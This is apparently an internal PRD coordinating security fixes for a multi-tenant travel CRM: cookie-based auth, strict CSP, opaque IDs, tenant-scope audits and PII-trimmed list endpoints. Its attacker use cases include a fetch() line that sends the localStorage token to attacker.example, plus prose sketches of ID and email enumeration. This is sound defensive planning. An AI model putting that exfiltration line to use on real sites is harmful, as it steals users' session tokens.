# PRD — Travel CRM Security Architecture (Auth Model + CSP + IDOR + PII)

**Status:** DRAFT • **Owner:** Platform-security squad (cross-cutting; Travel vertical is the immediate driver) • **Filed:** 2026-05-23 (tick #22)
**Refs:** GH #913 #914 #915 #916 #917 #918 #919 #920 #921 #922 #923 #924 (May 2026 security audit cluster — 9 OPEN, 2 CLOSED, 1 MERGED on filing date)
**Siblings:** [PRD_TRAVEL_B2B_AGENT_PORTAL.md](PRD_TRAVEL_B2B_AGENT_PORTAL.md) (introduces sub-agent + corporate portals — second + third logged-in surfaces; their auth model inherits whatever this PRD lands), [PRD_TRAVEL_MULTICHANNEL_LEADS.md](PRD_TRAVEL_MULTICHANNEL_LEADS.md) (16-channel intake — webhook endpoints inherit tenant-scoping rules from FR-3.4), [PRD_TRAVEL_BILLING.md](PRD_TRAVEL_BILLING.md) (commission ledger PII handling inherits redaction rules from FR-3.5)

---

## §1 Background + source attribution

### Current state (shipped)
- **Auth model.** [backend/middleware/auth.js](../backend/middleware/auth.js) reads the JWT from the `Authorization: Bearer <token>` header on every protected route. The frontend reads/writes the token to `localStorage` and attaches it via `fetchApi` ([frontend/src/utils/api.js](../frontend/src/utils/api.js)). This is the "JWT-in-localStorage + JS-attached-Bearer" pattern flagged by #914 and #924 — same root cause, two issue framings.
- **localStorage payload.** Beyond the JWT, the frontend persists `user` (object: id, email, role, tenantId, defaultCurrency, vertical, locale, wellnessRole) and `tenant` (object: id, name, vertical, country, defaultCurrency, locale, subBrandConfigJson, subscriptionTier) to localStorage so the AuthContext can hydrate the React tree on cold reload without an API round-trip. Flagged by #915 ("plaintext user + tenant data").
- **CSP transitional.** [backend/middleware/security.js](../backend/middleware/security.js):48-94 emits a Content-Security-Policy with `'unsafe-inline'` for both script-src and style-src. The comment block at lines 26-47 acknowledges this is a transitional posture chosen to ship CSP at all without breaking the Vite-built SPA's inline styles + legacy `onclick=` attributes. Flagged by #917 (and #923 — "X-XSS-Protection: 0 is safe only when paired with a strict CSP" — observes that since the CSP is permissive, the X-XSS-Protection: 0 default leaves no XSS-defense fallback).
- **Sequential IDs.** All Prisma models use `Int @id @default(autoincrement())` — Contact, Deal, Trip, Lead, Patient, Visit, Invoice, every entity. Predictable, enumerable, IDOR-friendly. Flagged by #918.
- **Tenant scoping.** Most routes use `tenantWhere(req)` helpers; spot-coverage gaps exist. The four routes (web_visitors, live_chat, chatbots, telephony) caught by the canonical #646 audit had silent cross-tenant fallbacks BEFORE the ESLint rule blocked `req.body.tenantId` reads. #919 asks for an exhaustive audit of /api/travel/* + /api/contacts/* routes for the same pattern.
- **PII payloads.** List endpoints (`GET /api/contacts`, `GET /api/travel/trips`, `GET /api/travel/itineraries`, etc.) return the full row payload — name + phone + email + address + every custom field. No summary projection. Flagged by #920.
- **Browser-extension surface.** Crypto-wallet extensions (MetaMask, Phantom, Coinbase Wallet) inject `window.ethereum` / `window.solana` keypair-shaped objects into every page on every origin, including the CRM. They also write probing data (typically `__react-extension`-prefixed keys, encrypted seed-shards, RPC connection tokens) to `localStorage` on every visited domain. Flagged by #921 — observation only, but it intersects #914 because the extension's page-script context can `JSON.parse(localStorage.getItem('token'))` directly.
- **Closed siblings:** #913 (JWT logged to browser console on Pricing page) and #922 (WWW-Authenticate realm fingerprinting) are CLOSED; #916 (umbrella security PR) is MERGED. They count as prior-art for the work this PRD coordinates, NOT as open scope.

### Why a coordinating PRD instead of fixing each issue independently
Each of the 9 open issues looks like an isolated security finding — but the remediation work has heavy structural overlap:
- **#914 + #915 + #924 collapse to one auth-migration project.** Moving the JWT from localStorage to an httpOnly cookie (the #914 fix) automatically removes the JS-attached Bearer header (#924) and means the AuthContext can re-hydrate from a small `/api/auth/me` round-trip rather than persisted localStorage (#915). One project, three closes.
- **#917 + #923 collapse to one CSP-hardening project.** Removing `'unsafe-inline'` (#917 fix) requires a build-step change to emit hashes-or-nonces, which is the same chain of work that makes `X-XSS-Protection: 1; mode=block` a meaningful belt-and-suspenders header (#923 fix).
- **#919 + #920 share the "audit every route" muscle.** Both require systematic per-route inspection of tenant-scoping AND response shape. Doing them as one sweep is cheaper than two.
- **#918 stands alone** (multi-day data migration; affects every Prisma model with public-facing IDs).
- **#921 is a non-fix-able observation** but informs WHY #914 and #917 are urgent — extension-injected XSS is the canonical pre-condition that turns localStorage token theft from theoretical to common-on-real-user-devices.

So the right structure is: one coordinating architecture PRD that pins the auth model + CSP target + IDOR strategy + PII-redaction policy as design decisions, plus the existing GH issues remaining open as work-item trackers that "Close: PRD_TRAVEL_SECURITY_ARCHITECTURE §X.Y" when shipped.

### Source attribution
- [backend/middleware/security.js](../backend/middleware/security.js) (current CSP / Helmet config + comment block laying out the transitional choice)
- [backend/middleware/auth.js](../backend/middleware/auth.js) (current verifyToken; #922's WWW-Authenticate fix already landed)
- [frontend/src/utils/api.js](../frontend/src/utils/api.js) (current localStorage token attach)
- May 2026 Globussoft security audit — 12 issues filed under `[Travel Security]` and `[Security]` labels
- OWASP ASVS v4.0.3 (session management + IDOR + PII redaction control families)
- Prior canonical patterns: #342 (Helmet headers regression), #646 (cross-tenant stripDangerous), #654 (CSP transitional enable), #922 (WWW-Authenticate fingerprinting)

---

## §2 Use cases (attacker perspective)

### 2.1 Extension-injected XSS → JWT theft → account takeover
Aanya (CRM operator at a Travel Stall reseller in Pune) installed MetaMask six months ago for a side hobby of NFT minting. The wallet's content-script runs on every page-load, including `crm.globusdemos.com`. A drive-by infection from an unrelated phishing tab cross-pollutes MetaMask's storage with a malicious payload that runs `fetch('https://attacker.example/x?t=' + localStorage.getItem('token'))` on the next page-load. Aanya's Bearer token leaves her machine; the attacker now has 24h of unauthenticated access to her tenant's full deal pipeline + 8,000 contacts. Issues this chains across: #914 (JWT readable from JS), #915 (user object readable from JS — adds tenantId + role to the exfil), #921 (extension is the injection vector), #917 (CSP doesn't block the inline script the extension injected because `'unsafe-inline'` is on script-src).

### 2.2 IDOR via sequential trip ID
A competing travel agency's analyst scripts a 1-hour run that calls `GET /api/travel/trips/1`, `/2`, `/3`, ... up to `/50000`, using a free-tier signup token. Today, if any route is missing the `tenantWhere(req)` filter, they'd get every other tenant's trip data — itineraries, customer names, prices, suppliers, margins. Issues: #918 (sequential IDs make enumeration trivial), #919 (tenant-scoping completeness is the actual defense), #920 (even with tenant-scoping, the response payload reveals more than necessary).

### 2.3 Lookup endpoint leak via missing tenant scope
A bug-bounty researcher discovers that `GET /api/contacts?email=` accepts arbitrary email queries and (in the unfixed state of one of the 100+ routes) doesn't always filter by tenantId. They iterate ten thousand common-domain emails (gmail.com / outlook.com / corporate suffixes) and exfil a slice of every tenant's contact list with a single integer's worth of effort. Issues: #919 (the audit that catches this gap), #920 (the response shape that makes one row's leak proportional to the actual PII payload).

### 2.4 Bulk list endpoint as PII firehose
An insider with operator credentials calls `GET /api/contacts?limit=10000` once and walks away with 10,000 rows of `{id, name, phone, email, address, dob, customField1..N}`. The audit log records "one GET call." Issue: #920 — list endpoints should return summary shape (id + displayName + sub-brand) and route full PII through GET /:id which logs per-row access.

### 2.5 CSP unsafe-inline + reflected XSS chains
A search field with imperfect server-side sanitization reflects user input into the page (template-string interpolation in a notification). Because CSP allows `'unsafe-inline'` for script-src (#917), the injected `<script>` runs. With no strict CSP fallback AND `X-XSS-Protection: 0` (#923), no browser-side mitigation triggers. Combined with #914's localStorage-readable token, this becomes a 1-bug-to-full-takeover chain.

### 2.6 OAuth + cookie SameSite collision
The day after we ship httpOnly + SameSite=Strict cookies, the Google OAuth login flow breaks. The redirect from accounts.google.com back to `/api/auth/google/callback` is treated as a cross-site navigation by the browser; the cookie is not sent on the callback; the callback handler doesn't see the session and starts a new one, or fails outright. Open question: OQ-9.4. Use case is to surface that "ship cookie-based auth" is not a 1-day change — it needs an OAuth-flow audit alongside.

### 2.7 Background cron silently bypasses tenant scope
The orchestrator engine (`backend/cron/orchestratorEngine.js`) loops over every tenant and processes per-tenant work using internal Prisma calls. If a developer copies a route handler's code into a cron without preserving the tenant filter, the cron silently leaks data across tenant boundaries — no symptom, no error, just an audit log entry in the wrong place. #919 demands the audit cover cron-callsites too, not just HTTP routes.

---

## §3 Functional requirements

### FR-3.1 Auth model migration (closes #914 #915 #924)
- (a) **Storage flip.** JWT moves from `localStorage` → httpOnly + Secure + SameSite=Lax cookie (Lax, not Strict — needed for OAuth redirect-from-third-party flows; see OQ-9.4 + DD-5.1).
- (b) **Server contract.** On login (POST `/api/auth/login`), server emits `Set-Cookie: session=<jwt>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400`. On every subsequent request, `verifyToken` reads the cookie via `req.cookies.session` (cookie-parser middleware is already mounted for csurf, see [backend/middleware/security.js](../backend/middleware/security.js)). The `Authorization: Bearer` header path is preserved for 7 days post-cutover for grace-period back-compat.
- (c) **CSRF defense.** Cookie-based auth is automatic on every same-origin request — including malicious cross-origin form-submits. Add csurf-style protection: double-submit token where the server emits a `csrfToken` in the login response body AND the SPA attaches it as `X-CSRF-Token` header on every state-changing request. csurf middleware is already in the codebase (security.js); needs activation + frontend wiring.
- (d) **Frontend.** AuthContext stops reading `localStorage.getItem('token')`. Instead it calls `GET /api/auth/me` on app cold-start to hydrate the user+tenant (replacing the localStorage persistence flagged by #915). Reduces cold-start time by 0ms (parallel with first /api/dashboard call) at the cost of one round-trip per session.
- (e) **Logout flow.** POST `/api/auth/logout` clears the cookie server-side AND records a logout event in a server-side denylist (Redis or in-memory map keyed by JWT jti claim) so an exfiltrated token from before logout becomes invalid immediately. JWT-as-stateless is preserved for read-only tokens; explicit invalidation is the cost of "logout means logout."
- (f) **Migration path.** Feature-flag `FEATURE_HTTPONLY_AUTH=true` per tenant. New logins set both cookie AND return token in JSON body (frontend prefers cookie when available, falls back to localStorage). After 14 days of dual-mode, drop the JSON body token field. After 30 days, drop the localStorage fallback in the frontend.

### FR-3.2 CSP hardening (closes #917 #923)
- (a) **Remove 'unsafe-inline' from script-src.** Two prerequisites: (i) audit + migrate every remaining `onclick=` / inline `<script>` attribute in the SPA to event-handler-attach (already partially done; the open work is enumerated in #917's comments — Recharts inline SVG `<script>` tags are the main blocker); (ii) emit a per-request CSP nonce from the backend (via response header + injected into the initial HTML by a small Express middleware), and have the Vite build inject that nonce into legitimate scripts.
- (b) **Remove 'unsafe-inline' from style-src.** Two paths: (i) ship hash-based CSP (`'sha256-...'` for every legitimate inline style block — fragile if styles drift) OR (ii) use CSP nonces (matches the script-src strategy above) OR (iii) eliminate inline styles entirely by switching React/Recharts inline `style={{}}` to className-driven CSS-modules. Path (iii) is cleanest but a multi-week refactor; (ii) is the pragmatic compromise.
- (c) **Source allowlist.** Connect-src, img-src, frame-src already pin specific hosts; tighten any wildcards. Special attention to `wss:` — should pin to the specific Socket.io host, not blanket allow.
- (d) **Report-only rollout.** Ship `Content-Security-Policy-Report-Only` with the strict directive set for 14 days alongside the existing `Content-Security-Policy` permissive one. Browser sends violation reports to `report-uri /api/csp-report`; we inspect; we adjust; only then do we switch the strict version to enforcement.
- (e) **X-XSS-Protection flip.** Once strict CSP is enforcing, X-XSS-Protection: 0 stays (modern browsers ignore it and modern guidance is "off when CSP is strict"). #923's framing — "X-XSS-Protection: 0 is safe only when paired with strict CSP" — is satisfied by FR-3.2.a + .b landing, NOT by changing the header value.

### FR-3.3 IDOR mitigation (closes #918)
- (a) **Public-facing IDs become opaque.** Every Prisma model that has a customer-facing ID (Contact, Deal, Trip, Itinerary, Lead, Patient, Visit, Invoice, Quote, Estimate, ConsentForm, SignatureRequest, BookingPage, LandingPage) gains a `publicId String @unique @default(cuid())` column. Routes that accept the ID from the URL (e.g. `GET /api/travel/trips/:id`) switch to accepting either form (compatibility window) and prefer the publicId. After cutover, internal integer IDs become server-internal-only and the route signature is `GET /api/travel/trips/:publicId`.
- (b) **Internal references unchanged.** Foreign keys (Trip.dealId, Visit.patientId, etc.) stay as Int — they're never serialized to clients, and the Prisma layer handles the join. No data migration on FK columns.
- (c) **Tenant-scope check stays mandatory.** Opaque IDs make enumeration harder; they don't make missing tenant-scope safe. The defense-in-depth is "publicId + tenantWhere(req) + ACL check," not "publicId alone."
- (d) **Object-level ACL.** Tenant-scope catches cross-tenant leaks. Per-user ACL catches in-tenant leaks (one rep reading another rep's deals). The existing `fieldFilter` middleware is the seed; extend it to do row-level checks ("can this user see THIS row?") for sensitive entities (Deal — partially shipped via owner/team; Patient — needs DD-5.X; Visit; ConsentForm).
- (e) **Migration is multi-day.** Adding the publicId column + backfill + dual-route + flag-cut + dropping the integer-id route is 5-7 engineering days assuming no test surprises. Bigger than the other FRs.

### FR-3.4 Tenant scoping completeness audit (closes #919)
- (a) **Audit scope.** Every route in `backend/routes/*.js` (102 files) — focus first on `routes/travel*.js` (9 files) and `routes/contacts.js` per #919's framing, then expand to the full set since the same risk applies everywhere.
- (b) **Audit method.** For each route handler that takes a path/query/body parameter that lands in a Prisma `where` clause, verify either (i) the where clause has explicit `tenantId: req.user.tenantId`, OR (ii) the handler calls `tenantWhere(req)` which centralizes it, OR (iii) the route is documented as cross-tenant (admin-only) AND has `verifyRole(['ADMIN'])` guarding it.
- (c) **Automated regression test.** A new gate spec at `e2e/tests/tenant-isolation-sweep-api.spec.js` enumerates every list / detail / mutate endpoint and asserts a cross-tenant Bearer token returns 0 rows / 403 / 404 — never 200 with another tenant's data. Coverage check at CI time. (This complements but does not replace the existing `cross-tenant-stripdangerous-api.spec.js` which pins the body-stripping shape.)
- (d) **Default-deny.** Add an ESLint rule (extend `backend/eslint.config.js`) that errors on Prisma `findMany` / `findFirst` / `update` / `delete` calls inside `routes/` that don't include a `tenantId` key in the where clause, with an explicit `// eslint-disable-next-line tenant-scope-required` escape hatch + comment for the rare cross-tenant case (similar pattern to the existing `no-restricted-syntax` block on `req.body.{id,userId,tenantId}`). Backed by the existing PR-level enforcement so new routes can never silently regress.
- (e) **Cron callsite audit.** The cron engines (22 of them) make Prisma calls outside the request-handler context. Each engine must either operate per-tenant inside an explicit loop (orchestratorEngine pattern) OR include the tenantId in every where clause. Audit deliverable: a table of each engine + tenant-scope mechanism + verified-OK or fix-needed.

### FR-3.5 PII payload reduction (closes #920)
- (a) **List endpoints return summary projections.** `GET /api/contacts` returns `[{publicId, displayName, primaryChannelKind, subBrandKey, createdAt}]` — no phone, email, address, custom fields. Similarly for `/api/travel/trips`, `/api/travel/itineraries`, etc.
- (b) **Detail endpoints unchanged in shape (initially).** `GET /api/contacts/:publicId` still returns the full row. The shift is "list ≠ detail," not "detail also shrinks."
- (c) **Per-row access audit.** Every detail GET emits an audit-log entry. Bulk-export (CSV / Excel) requires an explicit operator action (button-click that hits POST /api/contacts/export with a reason field), audits the operation, and rate-limits to N exports/day per user.
- (d) **fieldFilter middleware extended.** Existing field-level permissions (role-based) extend to PII fields: phone / email / dob / address visibility per role. `fieldPermissions` table already exists; the routes just need to thread through.
- (e) **Search endpoint exception.** Search endpoints (`GET /api/search?q=`) need partial-match against name/email/phone to be useful but should return summary projections too, not full PII. The full PII follows a click-through to the detail page.

### FR-3.6 Extension XSS isolation (mitigates #921; not a "close")
- (a) **iframe-isolate sensitive panels.** Account settings, password change, 2FA setup, API key management — render in an iframe served from `crm-secure.globusdemos.com` (separate subdomain → separate origin → different localStorage → browser extension can't reach in). The iframe's auth is its own cookie scoped to the subdomain.
- (b) **Shadow-DOM for embed widgets.** The lead-capture widget already lives in `frontend/public/embed/`; harden it with shadow-DOM encapsulation so partner-site scripts can't reach into its inputs.
- (c) **Subresource Integrity (SRI).** Every external `<script src>` (only jsdelivr CDN in the current allowlist) gains an `integrity="sha384-..."` attribute. Build-step automated via `vite-plugin-sri`.
- (d) **Operator-pasted HTML.** The KB-article editor + email-template editor accept HTML input; that input goes through `sanitize-html` already, but the allowlist needs review (no `<script>`, no `on*` attrs, no `javascript:` URLs, no `style=` with `url()` exfil patterns). Existing test gate is `xss-payload-fixtures.test.js`; extend with the OWASP XSS cheat sheet's full corpus.

### FR-3.7 Audit + observability
- (a) **Login event log.** Every login (success + fail) emits an AuditLog entry with email, IP, user-agent, outcome. Failures over N/min from one IP trigger alert.
- (b) **PII access events.** Every GET /detail or POST /export of a PII-bearing endpoint emits an entry. Cross-tenant attempts (caught by FR-3.4.c) emit a HIGH-severity entry that pages on-call.
- (c) **CSP violation reports.** `POST /api/csp-report` (with body-size + rate limits) ingests browser-emitted CSP violations into an `AuditLog`-style table. Spike detection alerts on unusual volume.
- (d) **Cross-tenant attempt = on-call page.** Any 200 response where `row.tenantId !== req.user.tenantId` is by definition a leak; ship a global response interceptor that aborts + alerts on the condition. Belt-and-suspenders behind FR-3.4 — if the audit misses a route, the interceptor catches the production occurrence.

---

## §4 Non-functional

- **Zero customer-visible downtime.** The auth-migration cutover is feature-flagged per tenant; rollback path is "flip the flag back, frontend falls back to localStorage." Test-tenant gets the flag first; production rollout is gradual.
- **Performance budget.** Cookie-based auth should add ≤+25ms per request vs JWT-localStorage (cookie parsing + signature verify is server-side and already happening today). New `/api/auth/me` cold-start round-trip is ≤200ms p95 (mostly Prisma roundtrip; no extra compute).
- **Backward compatibility window.** Bearer header is honored for 30 days post-cutover. localStorage fallback in frontend stays for 30 days. After day 30, both paths drop and any client that hasn't refreshed will get a 401 on next call (and the SPA hard-reloads through the new login flow).
- **Audit log retention.** Security events (login, PII access, cross-tenant attempts, CSP violations) retain for 365 days minimum. Existing retentionEngine has the policy hook.
- **CSP rollout safety.** Report-only mode is mandatory for 14+ days before enforcement. If violation volume in report-only is non-zero on production traffic, we don't flip enforcement until the violation root cause is fixed.
- **Migration safety.** The publicId backfill on every PII-bearing model (FR-3.3) goes through the same migration-check gate as every Prisma change ([deploy.yml](../.github/workflows/deploy.yml) migration_check job) — UNIQUE addition + bless marker required.
- **Browser support.** SameSite=Lax cookies are universal (Chrome 51+, Safari 12+, Firefox 60+). httpOnly cookies are universal. CSP Level 2 (nonces) is universal in 2026 browsers; CSP Level 3 (strict-dynamic, hashes-for-nonces) is desirable but not required for the FR-3.2 first pass.

---

## §5 Hand-over reqs / design decisions

### Design decisions blocking implementation
- **DD-5.1 Cookie storage shape.** Single session cookie carrying both access + refresh JWTs (simpler, one cookie to manage) vs split cookies (access in a short-TTL cookie, refresh in a long-TTL cookie at `/api/auth/refresh`-only path)? Recommendation: split — short TTL on the access cookie limits exfil-via-non-XSS routes (e.g. server logs that capture cookies). User input needed.
- **DD-5.2 Sequential-ID migration shape.** Add a `publicId` column alongside the existing `id` (preserves existing FKs, dual-route compatibility window) OR migrate `id` itself to a string column (cleaner final state, but every FK in the schema needs updating in one transaction)? Recommendation: dual-column (FR-3.3.a as written). Cheaper in production; same final security posture. User input needed.
- **DD-5.3 CSP violation report sink.** Sentry has native CSP-report ingestion ($) vs roll-our-own table + alerting ($0)? Recommendation: roll-our-own — we already have the AuditLog primitive and the alerting hooks; the Sentry CSP ingestion adds a vendor dependency for low marginal value. User input.
- **DD-5.4 PII redaction scope.** Per-endpoint hand-curated projection (FR-3.5.a as written) vs global response middleware that strips known-PII fields by default + a `verifyRole`-style escape hatch per route? Recommendation: per-endpoint — the routes that need full PII are obvious (detail GETs) and a middleware would surprise us in non-obvious places. User input.
- **DD-5.5 Rollout cadence.** Tenant-by-tenant feature flag with 14-day test windows OR a single CI-cutover after staging-tenant green? Recommendation: tenant-flag — Travel vertical has 1 tenant currently (the Travel Stall pilot), so "flag-by-tenant" reduces to "flag-by-environment" in practice. Other verticals (wellness Rishu, generic demo) need the same flip downstream. User input.
- **DD-5.6 Existing localStorage data lifecycle.** Clear-on-next-login (next session starts fresh in cookie mode) OR background-migrate (read localStorage on cold-start, POST to a `/api/auth/migrate-session` endpoint that issues a cookie + clears the original)? Recommendation: clear-on-next-login — simpler, no migration endpoint to attack, users get re-prompted for password once. User input.

### Cred chase
None external. All security infrastructure is in-house.

### Vendor docs / references
- OWASP ASVS v4.0.3 — sections V3 (Session Management), V4 (Access Control), V14 (Configuration)
- OWASP CSP Cheat Sheet (nonces + hashes + strict-dynamic)
- Mozilla SameSite Cookie Reference (Lax vs Strict trade-offs)
- Sentry CSP-report endpoint docs (if DD-5.3 picks Sentry)
- Existing project canon: [docs/cron-learnings-archive.md](cron-learnings-archive.md) (cross-cutting shape change guidance), [.claude/skills/auditing-cross-cutting-spec-impact/SKILL.md](../.claude/skills/auditing-cross-cutting-spec-impact/SKILL.md) (sweeps that touch many route shapes)

---

## §6 Acceptance criteria

- **AC-6.1 Token not JS-readable.** After cutover, `document.cookie` does not return the session JWT. Verified via integration test + manual browser-devtools check. Closes #914 + #924.
- **AC-6.2 No user PII in localStorage.** `localStorage` length is 0 (or contains only non-sensitive UI-state keys like `lastVisitedPage`) one hour after a fresh login. Closes #915.
- **AC-6.3 CSP enforcing without unsafe-inline.** `Content-Security-Policy` header on /api/* responses and HTML responses includes nonces + does NOT include `'unsafe-inline'` for script-src. SPA renders all pages correctly with no console CSP violations. Closes #917.
- **AC-6.4 Defense layer for X-XSS-Protection.** With CSP-enforcing in place, AC-6.3 is sufficient to close #923 — the framing "X-XSS-Protection: 0 is safe only when paired with strict CSP" is satisfied.
- **AC-6.5 Opaque IDs on customer-facing routes.** `GET /api/travel/trips/<integer>` returns 404 (the route only accepts publicId). publicIds are 16+ chars, non-sequential. Closes #918.
- **AC-6.6 Cross-tenant integration test.** New gate spec `tenant-isolation-sweep-api.spec.js` enumerates 50+ routes and asserts that a Tenant-B Bearer token cannot read Tenant-A rows. Spec is in the deploy.yml gate list. Closes #919.
- **AC-6.7 List endpoint payload audit.** Manual diff of every `*-api.spec.js` list-endpoint snapshot before/after: phone, email, address, dob, custom-field values are not present. Closes #920.
- **AC-6.8 CSP violation telemetry.** /api/csp-report is live, receiving traffic from production, has dashboard. Spike alert is configured.
- **AC-6.9 Logout invalidates server-side.** Sending a previously-logged-out JWT to any endpoint returns 401 "session has been terminated" — not "session is valid." Backed by the FR-3.1.e denylist.
- **AC-6.10 ESLint tenant-scope-required rule active.** `eslint backend/routes/` errors on a `findMany({ where: { … } })` call inside a route handler that doesn't include `tenantId` in the where clause. Closes the FR-3.4.d slot.
- **AC-6.11 No extension-readable session data.** A test with a crypto-wallet extension installed (MetaMask in Playwright user-data-dir) cannot read the session JWT from `document.cookie` OR from `localStorage`. Mitigates #921 (observation, not full close — extensions remain a present threat that we contain rather than eliminate).
- **AC-6.12 Two PRD-cross-route prerequisites met.** Sub-agent portal (PRD_TRAVEL_B2B_AGENT_PORTAL.md FR-3.1 portal-JWT) inherits the cookie-based auth shape from this PRD. Sub-brand microsite (PRD_TRAVEL_MULTICHANNEL_LEADS.md webhook-intake) inherits the tenant-scoping rules from FR-3.4 of this PRD. Both downstream PRDs reference this section number as their auth-model prerequisite.

---

## §7 Out of scope

- **Rate limiting.** Already shipped via express-rate-limit; tightening per-route limits is a separate Tier P2 item.
- **2FA enforcement / required.** Existing feature ([routes/auth_2fa.js](../backend/routes/auth_2fa.js)); making it mandatory for ADMIN role is a policy decision tracked separately.
- **Database column-level encryption.** Existing `backend/lib/fieldEncryption.js` is opt-in via `WELLNESS_FIELD_KEY`. Expanding to all PII at rest is a separate Phase 3 item — not blocked by this PRD, and parallel-shippable.
- **Penetration testing automation.** External pen-test cadence is an ops decision, not an architecture PRD scope.
- **Single Sign-On (SSO) flow changes.** Existing SAML / OIDC SSO ([routes/sso.js](../backend/routes/sso.js)) needs cookie-flow review (OQ-9.4) but the implementation is a separate work item, not blocking this PRD's core architecture decisions.
- **Mobile app (React Native or Capacitor wrapper).** No mobile app exists today; if/when one ships, the cookie model needs a mobile-specific adaptation (OQ-9.2). Not in scope for this PRD.
- **Wellness portal (PatientPortal).** Patient-side `/portal` already uses phone+OTP + scoped-JWT pattern that lives outside the operator auth flow. Migrating it to cookies is a separate consideration — operators are first; patient portal follows when operator pattern is stable.

---

## §8 Dependencies

- **Existing security middleware.** [backend/middleware/security.js](../backend/middleware/security.js) — Helmet, CSP, csurf scaffolding, cookie-parser.
- **Existing auth middleware.** [backend/middleware/auth.js](../backend/middleware/auth.js) — verifyToken (header-based), verifyRole.
- **Existing config.** [backend/config/secrets.js](../backend/config/secrets.js) — JWT_SECRET centralization (P1.3 land).
- **Existing tenantWhere helpers.** Spread across many route files; canonicalize to a shared lib in FR-3.4.
- **Existing fieldFilter middleware.** [backend/middleware/fieldFilter.js](../backend/middleware/fieldFilter.js) — extends in FR-3.5.d.
- **Existing audit log infrastructure.** AuditLog model + auditIntegrityEngine + writeAudit helper — extends in FR-3.7.
- **Existing migration-check gate.** [.github/workflows/deploy.yml](../.github/workflows/deploy.yml) migration_check job — FR-3.3 publicId backfill goes through this gate with [allow-unique] bless marker.
- **Frontend AuthContext.** [frontend/src/App.jsx](../frontend/src/App.jsx) — needs the cold-start `/api/auth/me` flip for FR-3.1.d.
- **Existing external API auth.** [backend/middleware/externalAuth.js](../backend/middleware/externalAuth.js) — X-API-Key based; OUTSIDE the scope of this PRD (operator session auth only).

---

## §9 Open questions

- **OQ-9.1 Feature-flag opt-out during rollout.** Should we offer a per-tenant escape hatch ("use old localStorage flow") for the first 60 days post-cutover? Trades migration safety against operational complexity (two auth modes to support). Recommendation: yes, with a sunset date hardcoded in the flag check.
- **OQ-9.2 Mobile app implications.** No mobile app today, but if a Capacitor wrapper or React Native ships, native HTTP clients don't share cookies with the web browser session by default. Need a strategy (token-via-secure-storage on native, cookie on web) before mobile lands. Park for now; flag for the mobile PRD when it surfaces.
- **OQ-9.3 Subdomain cookie scope.** SameSite=Lax + Domain=globusdemos.com lets the cookie flow to `*.globusdemos.com`. Do we WANT it scoped to apex (so future `app.globusdemos.com` works) OR strictly to `crm.globusdemos.com`? Recommendation: scope to `crm.globusdemos.com` for now; widen later if a multi-app federation lands.
- **OQ-9.4 OAuth flow + SameSite collision.** The Google/Microsoft OAuth redirect callback is a cross-site navigation. SameSite=Strict drops the cookie entirely; SameSite=Lax allows it for "safe" methods (GET) but drops for POST. The callback is a GET — should work — but needs a 30-min PoC to confirm. Park.
- **OQ-9.5 Security-event SLA + on-call.** What's the response-time SLA when a cross-tenant attempt is detected? PagerDuty integration? Today we have Sentry; security-specific paging is undefined. User input on the on-call setup.
- **OQ-9.6 CSP nonce delivery for static HTML.** The Vite-built SPA's `index.html` is served by Nginx (not Express) on production. Injecting a per-request nonce into a static file requires either an Nginx Lua module, a Nginx-level proxy through Express for the HTML, or a build-time strategy with rotating nonces. Each has trade-offs. Park; address during FR-3.2 implementation.
- **OQ-9.7 publicId collision risk.** cuid()'s entropy is sufficient for billions of rows, but the production DB will have multi-million Contact + Lead rows over time. Should we use cuid2 (newer collision-resistance generation) or uuid v7 (sortable + collision-safe)? Recommendation: uuid v7 for sortability advantage. User input.
- **OQ-9.8 Field-permission UX.** FR-3.5.d extends the existing field permissions to PII fields. Today operators with restricted view see masked values ("***@example.com"). UX call: do we hide-the-field-entirely, show-mask, or show-mask + "request access" CTA? User input.

---

## §10 Status snapshot (2026-05-23)

- **Current state:** All 9 open security findings are unmitigated as architectural risks; each has discrete remediation work scoped but inter-dependencies make uncoordinated fixes wasteful. CSP transitional state has been live since `#654` landed; auth-in-localStorage has been the shape since v1.
- **This PRD:** WRITTEN 2026-05-23 (tick #22). DRAFT; needs DD-5.1, DD-5.2, DD-5.3, DD-5.4, DD-5.5, DD-5.6 design-call answers before implementation can start.
- **Issue map (filing date 2026-05-23):**
  - **OPEN (9):** #914 #915 #917 #918 #919 #920 #921 #923 #924 — all coordinated by this PRD.
  - **CLOSED (2):** #913 (JWT console-log fix landed), #922 (WWW-Authenticate realm dropped).
  - **MERGED (1):** #916 (umbrella security PR landed earlier).
- **Path to remediation:** 18-32 engineering days end-to-end:
  - FR-3.1 (auth migration) — 4-6 days (cookie wiring + csrf + grace-period dual-mode + AuthContext refactor + per-tenant flag rollout)
  - FR-3.2 (CSP hardening) — 2-3 days (nonce middleware + Vite build update + report-only inspection + enforcement flip)
  - FR-3.3 (IDOR / opaque IDs) — 5-7 days (publicId column + backfill + dual-route + frontend migration + cutover)
  - FR-3.4 (tenant-scope audit) — 3-5 days (100+ routes audit + new gate spec + ESLint rule + cron callsite review)
  - FR-3.5 (PII payload reduction) — 2-3 days (list-endpoint projection sweep + fieldFilter extension)
  - FR-3.6 (extension XSS isolation) — 2-4 days (iframe-isolation panels + SRI build step + html-sanitize allowlist review)
  - FR-3.7 (audit + observability) — 1-2 days (CSP-report endpoint + cross-tenant interceptor + alerting wiring)
- **Sequencing.** FR-3.1 + FR-3.4 first (auth migration + tenant-scope audit set the foundation). FR-3.3 in parallel after FR-3.4 (opaque IDs need the tenant-scope discipline already verified). FR-3.2 + FR-3.5 + FR-3.6 + FR-3.7 in parallel after the foundation lands.
- **Blocking:** DD-5.1 (cookie shape), DD-5.2 (id-migration shape), DD-5.5 (rollout cadence) are the three critical-path design calls. The other three (DD-5.3 CSP sink, DD-5.4 PII strategy, DD-5.6 localStorage lifecycle) can resolve during impl.
- **Cross-references:** PRD_TRAVEL_B2B_AGENT_PORTAL §3.1 (sub-agent portal-JWT) inherits FR-3.1; PRD_TRAVEL_MULTICHANNEL_LEADS §3.X (webhook intake) inherits FR-3.4; PRD_TRAVEL_BILLING (commission-ledger PII exposure on the portal) inherits FR-3.5. This PRD is upstream of all three; landing FR-3.1 + FR-3.4 unblocks them.
- **Out-of-band note on #921.** The crypto-wallet extension observation is real but not "fixable" in the pure sense — extensions have content-script access by design. The defense is making the attack surface smaller (no JS-readable tokens, no plaintext PII in localStorage) so even with extension injection the blast radius is bounded. Marking #921 "mitigated" rather than "closed" is the correct shape on completion.
